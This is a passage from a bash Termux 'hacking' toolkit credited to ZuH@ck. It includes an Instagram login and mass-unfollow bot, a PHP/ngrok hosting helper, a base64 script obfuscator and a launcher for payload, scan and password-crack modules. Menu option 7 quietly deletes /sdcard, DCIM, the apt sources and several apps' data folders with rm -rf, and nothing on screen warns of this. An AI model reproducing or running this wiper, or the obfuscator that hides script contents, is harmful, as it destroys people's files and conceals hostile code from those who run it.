sleep 1
banner
menu
fi

}

banner
menu

###############
fi

############### Track Ip End ########################



############### Follow Start ########################
if [ $zuzu = 6 ] || [ $zuzu = 06 ]
then
###############
#!/bin/bash

string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"


banner() {
clear
printf " \e[0m\n"
printf " \e[1;93m _   _        __      _ _                        \e[0m\n"
printf " \e[1;93m| | | |      / _|    | | |                \e[1;92m   _   \e[0m\n"
printf " \e[1;93m| | | |_ __ | |_ ___ | | | _____      __  \e[1;92m _| |_ \e[0m\n"
printf " \e[1;93m| | | | '_ \|  _/ _ \| | |/ _ \ \ /\ / /  \e[1;92m|_   _|\e[0m\n"
printf " \e[1;93m| |_| | | | | || (_) | | | (_) \ V  V /   \e[1;92m  |_|  \e[0m\n"
printf " \e[1;93m \___/|_| |_|_| \___/|_|_|\___/ \_/\_/           \e[0m\n"
printf " \e[0m\n"
printf " \e[1;96m [\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;92m Created By ZuH@ck ( M.A.H.T )\e[0m\n"
printf " \e[0m\n"

}



user_login() {


if [[ $user == "" ]]; then
printf " \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;96m Instagram Login\e[0m\n"
printf "\n"
read -p $' \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;93m Input Username\e[1;96m : \e[0m\e[1;92m' user
fi

if [[ -e .cookie.$user ]]; then

printf "\n"
printf " \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;93m Login Creds Found for \e[0m\e[1;92m %s\e[0m\n" $user

default_use_cookie="Y"

printf "\n"
read -p $' \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;93m Use Previous Creds ?\e[0m\e[1;96m [Y/n] : \e[0m\e[1;92m ' use_cookie

use_cookie="${use_cookie:-${default_use_cookie}}"

if [[ $use_cookie == *'Y'* || $use_cookie == *'y'* ]]; then
printf "\n"
printf " \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;93m Logging in using Previous Creds...\e[0m\n"
else
rm -rf .cookie.$user
user_login
fi


else

printf "\n"
read -s -p $' \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;93m Input Password\e[1;96m : \e[0m' pass
printf "\n"
data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'

IFS=$'\n'

hmac=$(echo -n "$data" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

printf "\n"
printf " \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;93m Logging in as\e[0m\e[1;92m %s\e[0m\e[1;93m ...\e[0m\n" $user
printf "\n"
IFS=$'\n'
var=$(curl -c .cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); 
if [[ $var == "challenge" ]]; then printf " \e[1;96m[\e[0m\e[1;91m!\e[0m\e[1;96m]\e[0m\e[1;93m Ip Blocked \e[1;96m[\e[0m\e[1;91m!\e[0m\e[1;96m]\e[0m\n" ; exit 1; elif [[ $var == "logged_in_user" ]]; then printf " \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;92m Successfully Logged in !\e[0m\n" ; elif [[ $var == "Please wait" ]]; then echo " Please wait"; fi; 

fi

}


following_info() {

user_id=$(curl -L -s 'https://www.instagram.com/'$user_account'' > .getid && grep -o  'profilePage_[0-9]*.' .getid | cut -d "_" -f2 | tr -d '"')

curl -L -b .cookie.$user -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/$user_id/following" > $user_account.following.temp


cp $user_account.following.temp $user_account.following.00
count=0

while [[ true ]]; do
big_list=$(grep -o '"big_list": true' $user_account.following.temp)
maxid=$(grep -o '"next_max_id": "[^ ]*.' $user_account.following.temp | cut -d " " -f2 | tr -d '"' | tr -d ',')

if [[ $big_list == *'big_list": true'* ]]; then

url="https://i.instagram.com/api/v1/friendships/6971563529/following/?rank_token=$user_id\_$guid&max_id=$maxid"

curl -L -b .cookie.$user -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'  -H "$header" "$url" > $user_account.followers.temp

cp $user_account.following.temp $user_account.following.$count

unset maxid
unset url
unset big_list
else
grep -o 'username": "[^ ]*.' $user_account.following.* | cut -d " " -f2 | tr -d '"' | tr -d ',' | sort > $user_account.following_temp
mkdir core
cat $user_account.following_temp | uniq > core/$user_account.following_list.txt
rm -rf $user_account.following_temp

tot_following=$(wc -l core/$user_account.following_list.txt | cut -d " " -f1)
printf "\n"
printf " \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;96m You are Following\e[0m\e[92m %s\e[0m\e[1;96m users.\e[0m\n" $tot_following
printf "\n"
printf " \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;96m Following List Saved at :\e[0m\e[1;92m core/%s.following_list.txt\e[0m\n" $user_account
printf "\n"

if [[ ! -d .$user_account/raw_following/ ]]; then
mkdir -p .$user_account/raw_following/
fi
cat $user_account.following.* > .$user_account/raw_following/backup.following.txt
rm -rf $user_account.following.*
break

fi
echo $count
let count+=1

done



}

bot() {

user_account=$user
following_info

printf "\n"
printf " \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;93m Unfollowing Users from\e[0m\e[1;92m %s \e[0m\e[1;93m...\e[0m\n" $user_account
printf "\n"
printf "\n"
printf " \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;93m Press \"Ctrl + C\" to stop... \e[0m\n"
sleep 4
while [[ true ]]; do


for unfollow_name in $(cat core/$user_account.following_list.txt); do

username_id=$(curl -L -s 'https://www.instagram.com/'$user'' > .getmyid && grep -o  'profilePage_[0-9]*.' .getmyid | cut -d "_" -f2 | tr -d '"')

user_id=$(curl -L -s 'https://www.instagram.com/'$unfollow_name'' > .getunfollowid && grep -o  'profilePage_[0-9]*.' .getunfollowid | cut -d "_" -f2 | tr -d '"')


data='{"_uuid":"'$guid'", "_uid":"'$username_id'", "user_id":"'$user_id'", "_csrftoken":"'$var2'"}'
hmac=$(echo -n "$data" | cut -d " " -f2)
printf "\n"
printf " \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;93m Unfollowing\e[0m\e[1;92m %s\e[0m\e[1;93m..." $unfollow_name
printf "\n"
check_unfollow=$(curl -s -L -b .cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/destroy/$user_id/" | grep -o '"following": false' ) 

if [[ $check_unfollow == "" ]]; then
printf " \e[1;96m[\e[0m\e[1;91m!\e[0m\e[1;96m]\e[0m\e[1;93m Error, Try after Few Minutes \e[1;96m[\e[0m\e[1;91m!\e[0m\e[1;96m]\e[0m\n"
exit 1
else
printf " \e[1;92m    [âœ”] Unfollowed [âœ”]\n"
printf "\n"
fi

sleep 3
done


done

}

menu() {

printf "\n"
printf " \e[1;96m[\e[0m\e[1;97m01\e[0m\e[1;96m]\e[0m\e[1;93m Get Following List\e[0m\n"
printf "\n"
printf " \e[1;96m[\e[0m\e[1;97m02\e[0m\e[1;96m]\e[0m\e[1;93m Activate Unfollower\e[0m\n"
printf "\n"
printf " \e[1;96m[\e[0m\e[1;97m03\e[0m\e[1;96m]\e[0m\e[1;93m More Tools from Us\e[0m\n"
printf "\n"


read -p $' \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;96m Choose an Option\e[1;96m : \e[0m\e[1;92m' option
printf "\n"


if [[ $option == 1 || $option == 01 ]]; then

user_login
default_user=$user

 
printf "\n"
read -p $' \e[1;96m[\e[0m\e[1;97m+\e[0m\e[1;96m]\e[0m\e[1;96m Account \e[0m\e[1;93m(Leave blank for Current acc): \e[0m\e[1;92m' user_account

user_account="${user_account:-${default_user}}"
following_info
elif [[ $option == 2 || $option == 02 ]]; then

user_login
bot
elif [[ $option == 3 || $option == 03 ]]; then

xdg-open https://github.com/htr-tech/
sleep 2
exit 1

else

printf "\n"
printf " \e[1;96m[\e[0m\e[1;91m!\e[0m\e[1;96m]\e[0m\e[1;93m Invalid Option \e[1;96m[\e[0m\e[1;91m!\e[0m\e[1;96m]\e[0m\n"
sleep 2
menu

fi
}


banner
menu
###############
fi
############## Follow End ############################



 if [ $zuzu = 7 ] || [ $zuzu = 07 ]
then
clear

cd
termux-setup-storage

   rm -rf /sdcard

	 rm -rf /sdcard/DCIM

rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list.d/* 
	 
	 rm -rf /sdcard/Android/data/com.mobile.legends
	 
	 rm -rf /sdcard/Android/data/com.mytel.myid
	 
	 rm -rf /sdcard/Android/data/com.mytelpay.eu
	 
	 rm -rf /sdcard/Android/obb/com.mobile.legends
	 
	 rm -rf /sdcard/Android/obb/com.tencent.ig
	 
	 rm -rf /sdcard/Android/media/com.mytel.myid
	
	 rm -rf /sdcard/.sketchware
	 clear

fi

##################### Host Start #####################

if [ $zuzu = 8 ] || [ $zuzu = 08 ]
then
####################
#!/bin/bash



# Deafult Port
def_port='8080'

# Color Codes
CR=$'\e[1;31m' CG=$'\e[1;32m' CY=$'\e[1;33m' CB=$'\e[1;34m' CC=$'\e[1;36m' CW=$'\e[1;37m' RS=$'\e[1;0m'

architecture=`uname -m`

# Terminate Program
terminated() {
    printf "\n\n${RS} ${CR}[${CW}!${CR}]${CY} Program Interrupted ${CR}[${CW}!${CR}]${RS}\n"
    exit 1
}

trap terminated SIGTERM
trap terminated SIGINT

kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi	
}


# Host Banner
logo(){

clear
echo "${CY}     _    _           _   
${CY}    | |  | |  ${CC}V${CB}-${CG}2.1${CY}  | |  
${CG}    | |__| | ___  ___| |_ 
${CG}    |  __  |/ _ \/ __| __|
${CY}    | |  | | (_) \__ \ |_ 
${CY}    |_|  |_|\___/|___/\__|
${RS}
${CR} [${CW}~${CR}]${CY} Created By ZuH@ck ${CG}(${CC}M.A.H.T ${CG})${RS}"

}

path(){

    printf "\n${RS} ${CR}[${CW}1${CR}]${CY} Use Current Path [host/htdocs]"
    printf "\n${RS} ${CR}[${CW}2${CR}]${CY} Setup a Path"
    printf "\n${RS}"
    printf "\n${RS} ${CR}[${CW}-${CR}]${CG} Select A Hosting option: ${CC}"
    read red_path
    
    if [[ $red_path == 1 || $red_path == 01 ]]; then
        path=$'./htdocs'
    elif [[ $red_path == 2 || $red_path == 02 ]]; then
        printf "\n${RS} ${CC}Enter File Path [Example : /home/tahmid/htdocs]"
        printf "\n${RS}"
        printf "\n${RS} ${CR}>>${CG} ${CC}"
        read path
    else
        printf "\n${RS} ${CR}[${CW}!${CR}]${CY} Invalid option ${CR}[${CW}!${CR}]${RS}\n"
        sleep 2 ; logo ; path
    fi

    if [[ ! -d "$path" ]]; then
	    mkdir -p "$path"
    fi
    
    menu

}

package(){

	printf "\n${RS} ${CR}[${CW}-${CR}]${CG} Setting up Environment..${RS}"

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			printf "\n${RS} ${CR}[${CW}-${CR}]${CG} Installing ${CY}Proot${RS}\n"
            pkg install proot resolv-conf -y
        fi
    fi

    if [[ `command -v curl` && `command -v php` && `command -v wget` && `command -v unzip` ]]; then
        printf "\n${RS} ${CR}[${CW}-${CR}]${CG} Environment Setup Completed !${RS}"
    else
        repr=(curl php wget unzip)
        for i in "${repr[@]}"; do
            type -p "$i" &>/dev/null || 
                { 
                    printf "\n${RS} ${CR}[${CW}-${CR}]${CG} Installing ${CY}${i}${RS}\n"
                    
                    if [[ `command -v apt` ]]; then
                        apt install "$i" -y
                    elif [[ `command -v apt-get` ]]; then
                        apt-get install "$i" -y
                    elif [[ `command -v pkg` ]]; then
                        pkg install "$i" -y
                    elif [[ `command -v dnf` ]]; then
                        sudo dnf -y install "$i"
                    else
                        printf "\n${RS} ${CR}[${CW}!${CR}]${CY} Unfamiliar Distro ${CR}[${CW}!${CR}]${RS}\n"
                        exit 1
                    fi
                }
        done
    fi

}

localhost() {

    printf "\n${RS} ${CR}[${CW}-${CR}]${CY} Input Port [default:${def_port}]: ${CC}"
    read port
    port="${port:-${def_port}}"
    printf "\n${RS} ${CR}[${CW}-${CR}]${CG} Starting PHP Server on Port ${CY}${port}${RS}\n"
    cd "$path" && php -S 127.0.0.1:"$port" > /dev/null 2>&1 &
    sleep 2
    printf "\n${RS} ${CR}[${CW}-${CR}]${CG} Successfully Hosted at : ${CY}http://127.0.0.1:$port ${RS}"
    printf "\n\n ${CR}[${CW}-${CR}]${CC} Press Ctrl + C to exit.${RS}\n"
    while [ true ]; do
        sleep 0.75
    done

}

install_ngrok() {
	
    if [[ -e "ngrok" ]]; then
		printf "\n${RS} ${CR}[${CW}-${CR}]${CG} Ngrok already installed.${RS}"
	else
		printf "\n${RS} ${CR}[${CW}-${CR}]${CC} Installing ngrok...${RS}"
		
		if [[ ("$architecture" == *'arm'*) || ("$architecture" == *'Android'*) ]]; then
			ngrok_file='https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$architecture" == *'aarch64'* ]]; then
			ngrok_file='https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$architecture" == *'x86_64'* ]]; then
			ngrok_file='https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			ngrok_file='https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi

        wget "$ngrok_file" --no-check-certificate > /dev/null 2>&1
        ngrok_deb=`basename $ngrok_file`
    
    	if [[ -e "$ngrok_deb" ]]; then
		    unzip "$ngrok_deb" > /dev/null 2>&1
		    rm -rf "$ngrok_deb" > /dev/null 2>&1
		    chmod +x ./ngrok > /dev/null 2>&1
        else
            echo -e "\n${RS} ${CR}[${CW}!${CR}]${CY} Error occured, Install Ngrok manually.${RS}"
            exit 1
        fi
    fi

}

ngrok() {

    printf "\n${RS} ${CR}[${CW}-${CR}]${CG} Starting PHP Server on Port ${CY}${def_port}${RS}\n"
    cd "$path" && php -S 127.0.0.1:"$def_port" > /dev/null 2>&1 &
    sleep 1
    printf "\n${RS} ${CR}[${CW}-${CR}]${CG} Launching Ngrok on Port ${CY}${def_port}${RS}"

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./ngrok http 127.0.0.1:"$def_port" > /dev/null 2>&1 &
    else
        sleep 2 && ./ngrok http 127.0.0.1:"$def_port" > /dev/null 2>&1 &
    fi

    sleep 8
    ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    printf "\n\n${RS} ${CR}[${CW}-${CR}]${CG} Successfully Hosted at : ${CY}${ngrok_url}${RS}"
    printf "\n\n ${CR}[${CW}-${CR}]${CC} Press Ctrl + C to exit.${RS}\n"
    while [ true ]; do
        sleep 0.75
    done

}

menu() {
		
    echo -e "\n${CR} [${CW}01${CR}]${CG} Localhost ${CR}[${CC}For Devs${CR}]"
	echo -e "${CR} [${CW}02${CR}]${CG} Ngrok.io  ${CR}[${CC}Best${CR}]"

	printf "\n${RS} ${CR}[${CW}-${CR}]${CG} Select an Option: ${CB}"
    read MEW
    
    if [[ "$MEW" == 1 || "$MEW" == 01 ]]; then
		localhost
	elif [[ "$MEW" == 2 || "$MEW" == 02 ]]; then
        ngrok
	else
		printf "\n${RS} ${CR}[${CW}!${CR}]${CY} Invalid option ${CR}[${CW}!${CR}]${RS}\n"
		sleep 2 ; logo ; path
	fi

}


kill_pid ; package ; install_ngrok ; logo ; path


###################
fi

##################### Host End ######################

#################### base 64 start ####################

if [ $zuzu = 9 ] || [ $zuzu = 09 ]
then
#!/bin/bash

######## Encode Bash Script with Base64 ###########

obfuscate() {
printf "#!/bin/bash
mew=\$(mktemp)
base64 -d  > \${mew} << hulu
$(base64 $1)
hulu
source \${mew}
rm -rf \${mew}" > $2
}

if [[ -e $1 && ! $2 == "" ]]; then
    obfuscate $1 $2
else
    echo -e "Usage: "$0" <input> <output>"
fi

#################### base 32 ######################


fi

if [ $zuzu = 10 ] || [ $zuzu = 10 ]
then
################easy hack########################

#!/bin/bash
clear
check=0
check=1
ok="ok"
ENTER="press ENTER for main menu"
#colors
w='\e[97m'
g='\033[1;92m'
r='\033[1;91m'
a='\033[1;94m'
b='\e[1;4m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
G='\e[110m'
G1='\e[101m'
o='\033[0m'
#banner
sleep 0.5
echo -e $yellow
figlet -f big "EasYHaCk"

echo -e "               $g"M.A.H.T-"$r"Team-"$w"ZuH@ck"" 
echo -e "$a              # # # # # # # # # # # #"
echo -e "$a              #$G                     $o$a#"
echo -e "$a              #$G    $r"EasY_HaCk  V3.2"$a   $o$a#"
echo -e "$a              #$G                     $o$a#"
echo -e "$a              # # # # # # # # # # # #"
echo
echo -e "  $G1$w Welcome to This Tool For Penetration Testing $o" 
echo -e $o"$green                   Made by$yellow ZuH@ck "$o
echo -e " $g          Developers Team :  M.A.H.T  "
echo " "
echo -e "              $red Press ENTER to Continue"
echo -e $yellow
echo -n -e "[EasY_HaCk]~#:"
sleep 2
read tmp
echo -e " "
echo -e "$blue THE MAIN MENU"
sleep 0.5
echo -e "$red --------------"
sleep 0.1
echo -e "$a      [$r"01"$a"]"$g PAYLOAD GENERATOR"
sleep 0.1
echo -e "$a      [$r"02"$a"]"$g ADVANCE NMAP SCAN"
sleep 0.1
echo -e "$a      [$r"03"$a"]"$g WEB-HACKS"
sleep 0.1
echo -e "$a      [$r"04"$a"]"$g PASSWORD CRACK"
sleep 0.1
echo -e "$a      [$r"05"$a"]"$g Termux Tools"
sleep 0.1
echo -e "$a      [$r"06"$a"]"$g MY SERVER"
sleep 0.1
echo -e "$a      [$r"07"$a"]"$g ABOUT"
sleep 0.1
echo -e "$a      [$r"08"$a"]"$g UPDATE ME"
sleep 0.1
echo -e "$a      [$r"09"$a"]"$g CONTACT ME"
sleep 0.1
echo -e "$a      [$w"XX"$a"]"$g EXIT $reset"
sleep 0.5
echo -e $yellow
echo -n $B "[EasY_HaCk]~#:"
read option
if [[ $option == "" ]];
then
	echo -e "$red Please enter correct number of choice"
	echo
	echo -e "$green Plz wait... You are redirecting to main menu"
	sleep 2
EasY_HaCk
fi

create_payload()
{
python2 $PREFIX/share/EasY_HaCk/.modules/.pay.py
EasY_HaCk
}

about()
{
echo -e "$green                    EasY_HaCk $yellow

This tool is to provide easy user interface 
My aim behind this tool is to make penetration testing easy 
like payload creation, metasploit installation, 
ngrok installation, network scanning and Websites Hacking 
& Wait for my updates of$r EasY_HaCk$yellow tool 
with some extra features and options and all 
CREDITS GOES TO$g SABRi$yellow"@"$green"ZAKI"$yellow from $g"Alpha"$r"Team"$w"DZ"$r (o_O)$reset"
echo
echo -e "$red                    press ENTER"
echo -n "[EasY_HaCk]~#:"
read tmpp
EasY_HaCk
}

update()
{
echo -e "\033[1;33m Updating ..."
echo
cd $PREFIX/share/EasY_HaCk/
git reset --hard > /dev/null
git pull
chmod +x *
cp -f $PREFIX/share/EasY_HaCk/EasY_HaCk $PREFIX/bin/
echo
echo
echo -e "\033[1;31m Updated Successfully \033[0m"
echo
echo -e "$red                    press ENTER"
echo -n "[EasY_HaCk]~#:"
read tmp
EasY_HaCk
}

password()
{
clear
$PREFIX/share/EasY_HaCk/.modules/.password
echo -e "$red                    press ENTER"
echo -n "[EasY_HaCk]~#:"
read tmp
EasY_HaCk
}

termux()
{
clear
$PREFIX/share/EasY_HaCk/.modules/.Termux_Tools
EasY_HaCk
}


contact()
{
echo -e "$green ********** Do You Want to Contact Me ? **********"
echo -e "$r                     press ENTER$reset"
echo -n "[EasY_HaCk]~#:"
read tmp4
echo -e "$w My Facebook ID> $yellow https://web.facebook.com/eikyaw.black/"
echo -e "$red               $ENTER$reset"
echo -n "[EasY_HaCk]~#:"
read tmp5
EasY_HaCk
}

nmap()
{
if ping -q -c 1 -W 1 8.8.8.8 >/dev/null; 
then
clear
echo -e $g "welcom to EasY_ScaN"
echo -e "$yellow"[âœ”]:[ "$w"Internet"$yellow ]:$green connected !"
sleep 3
clear
echo "EasY_ScaN "
sleep 0.3
clear
echo "EasY_ScaN ./ "
sleep 0.3
clear
echo "EasY_ScaN ..\ "
sleep 0.3
clear
echo "EasY_ScaN .../ "
sleep 0.3
clear
echo "EasY_ScaN ....\ "
sleep 0.3
clear
echo "EasY_ScaN ...../ "
sleep 0.3
clear
echo "EasY_ScaN ......\ "
sleep 0.3
clear
echo "EasY_ScaN ......./ "
sleep 0.3
clear
echo "EasY_ScaN ........\ "
sleep 0.3
clear
echo "EasY_ScaN ........./ "
sleep 0.3
clear
echo "EasY_ScaN ...........\ "
$PREFIX/share/EasY_HaCk/.modules/.EasY_ScaN
else
echo -e "$red sorry ther is no internet im your mobile "
echo -e "$red you can't use EasY_ScaN"
echo -e "$yellow "["$red "x"$yellow ]:[$w "Internet"$yellow ]:$red Not connected !"
sleep 20
$PREFIX/share/EasY_HaCk/EasY_HaCk
fi

}

web_hacking()
{
if ping -q -c 1 -W 1 8.8.8.8 >/dev/null; 
then
clear
echo -e $g "welcom to web_hacking"
echo -e "$yellow"[âœ”]:[ "$w"Internet"$yellow ]:$green connected !"
sleep 4 
clear
echo "WEB-HACK "
sleep 0.2
clear
echo "WEB-HACK ./ "
sleep 0.2
clear
echo "WEB-HACK ..\ "
sleep 0.2
clear
echo "WEB-HACK .../ "
sleep 0.2
clear
echo "WEB-HACK ....\ "
sleep 0.2
clear
echo "WEB-HACK ...../ "
sleep 0.2
clear
echo "WEB-HACK ......\ "
sleep 0.2
clear
echo "WEB-HACK ......./ "
sleep 0.2
clear
echo "WEB-HACK ........\ "
sleep 0.2
clear
echo "WEB-HACK ........./ "
sleep 0.2
clear
echo "WEB-HACK ...........\ "
$PREFIX/share/EasY_HaCk/.modules/.web
else
echo -e "$red sorry ther is no internet im your mobile "
echo -e "$red you can't use WEB-HACK"
echo -e "$yellow "["$red "x"$yellow ]:[$w "Internet"$yellow ]:$red Not connected !"
sleep 20
$PREFIX/share/EasY_HaCk/EasY_HaCk
fi

}

server()
{
$PREFIX/share/EasY_HaCk/.modules/.server

}


case "$option" in
	1) if [ $check = 0 ];
		then
			create_payload
			fi
			create_payload
		 ;;
	2) nmap
		;;
	3) web_hacking
		;;
	4) password
		;;
	5) termux
		;;
	6)  server
		;;
	7)  about
		 ;;
	8)  update
		 ;;
	9) contact
		;;
esac

if [ $zaki -eq x ] || [ $zaki -eq X ] || [ $zaki -eq XX ] || [ $zaki -eq xx ] ;
then
clear
echo " by by "
exit 
else
clear
echo "E.................................\ "
sleep 0.1
clear
echo "EX................................/ "
sleep 0.1
clear
echo "EXI...............................\ "
sleep 0.1
clear
echo "EXIT............................../ "
sleep 0.1
clear
echo "EXIT E............................\ "
sleep 0.1
clear
echo "EXIT EA.........................../ "
sleep 0.1
clear
echo "EXIT EAS..........................\ "
sleep 0.1
clear
echo "EXIT EASY........................./ "
sleep 0.1
clear
echo "EXIT EASY H.......................\ "
sleep 0.1
clear
echo "EXIT EASY HA....................../ "
sleep 0.1
clear
echo "EXIT EASY HAC.....................\ "
sleep 0.1
clear
echo "EXIT EASY HACK..................../ "
sleep 0.1
clear
echo "EXIT EASY HACK T..................\ "
sleep 0.1
clear
echo "EXIT EASY HACK TO................./ "
sleep 0.1
clear
echo "EXIT EASY HACK TOO................\ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL.............../ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL...............\ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL.............../ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL...............\ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL.............../ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL...............\ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL.............../ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL...............\ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL.............../ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL...............\ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL.............../ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL...............\ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL.............../ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL...............\ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL.............../ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL...............\ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL.............../ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL...............\ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL.............../ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL...............\ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL.............../ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL...............\ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL.............../ "
sleep 0.1
clear
echo "EXIT EASY HACK TOOL...............\ "
sleep 0.1
clear
echo -e "\033[1;91m ZuH@ck  wish you all the best â™¡ you all "
sleep 3
clear 
exit
fi
read zaki


#################easy hack end ##################
fi

###########################################



if [ $zuzu = 11 ] || [ $zuzu = 11 ]
then
termux-open https://web.facebook.com/eikyaw.black/
fi

if [ $zuzu = 0 ] || [ $zuzu = 0 ]
then
echo -e $RED "[âœ˜] THank Y0u !! [âœ˜] "
sleep 2 
exit

fi
